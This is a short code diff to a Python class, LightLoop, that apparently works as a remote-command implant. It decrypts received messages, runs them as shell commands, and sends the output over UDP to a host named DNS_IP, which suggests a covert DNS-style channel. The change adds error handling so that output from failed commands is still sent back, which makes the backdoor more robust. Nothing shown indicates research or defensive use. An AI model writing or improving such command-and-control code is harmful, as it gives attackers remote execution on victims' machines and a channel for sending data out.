@@ -57,7 +57,10 @@ class LightLoop:
 
             command = self.decrypt(msgs[0])
             print("Executing the following command:", command, "- with timeout:", to)
-            res = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True, timeout=to)
+            try:
+                res = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True, timeout=to)
+            except subprocess.CalledProcessError as e:
+                res = e.output
             sock.sendto(res, (DNS_IP, DNS_SIGNAL_PORT))
 
 
